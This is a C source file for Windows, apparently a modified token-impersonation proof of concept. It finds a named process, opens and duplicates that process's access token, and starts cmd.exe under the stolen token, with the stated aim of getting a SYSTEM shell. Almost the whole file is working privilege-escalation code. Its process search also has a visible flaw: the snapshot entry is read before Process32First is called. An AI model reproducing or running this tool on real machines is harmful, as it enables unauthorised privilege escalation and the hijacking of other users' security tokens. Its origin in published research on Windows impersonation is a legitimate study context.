//
// modified verision of zc00l's impersonate poc to call shells with the token of other processes
// original code: https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html
//

#include "windows.h"
#include "tchar.h"
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")

HANDLE GetAccessToken(DWORD pid)
{

	/* Retrieves an access token for a process */
	HANDLE currentProcess = {};
	HANDLE AccessToken = {};
	DWORD LastError;

	if (pid == 0)
	{
		currentProcess = GetCurrentProcess();
	}
	else
	{
		currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
		if (!currentProcess)
		{
			LastError = GetLastError();
			wprintf(L"ERROR: OpenProcess(): %d\n", LastError);
			return (HANDLE)NULL;
		}
	}
	if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken))
	{
		LastError = GetLastError();
		wprintf(L"ERROR: OpenProcessToken(): %d\n", LastError);
		return (HANDLE)NULL;
	}
	return AccessToken;
}

DWORD findPidByName(wchar_t* pname)
{
	HANDLE h;
	PROCESSENTRY32 procSnapshot;
	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	procSnapshot.dwSize = sizeof(PROCESSENTRY32);

	do
	{
		if (!_wcsicmp(procSnapshot.szExeFile, pname))
		{
			DWORD pid = procSnapshot.th32ProcessID;
			CloseHandle(h);
			wprintf(TEXT("[+] PID found: %ld\n"), pid);
			return pid;
		}
	} while (Process32Next(h, &procSnapshot));

	CloseHandle(h);
	return 0;
}

int wmain(int argc, WCHAR** argv)
{
	DWORD LastError;

	if (argc < 2)
	{
		wprintf(L"Usage: %ls <process.exe>\n", argv[0]);
		return 1;
	}

	/* Process ID definition */
	DWORD pid = findPidByName(argv[1]);

	if ((pid == NULL) || (pid == 0)) {
		system("PAUSE");
		return 1;
	}

	// Retrieves the remote process token.
	HANDLE pToken = GetAccessToken(pid);

	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
	if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		system("PAUSE");
		return 1;
	}
	wprintf(L"Process token has been duplicated.\n");

	/* Starts a new process with SYSTEM token */
	STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};
	BOOL ret;
	ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!ret)
	{
		DWORD lastError;
		lastError = GetLastError();
		wprintf(L"CreateProcessWithTokenW: %d\n", lastError);
		system("PAUSE");
		return 1;
	}

	system("PAUSE");

}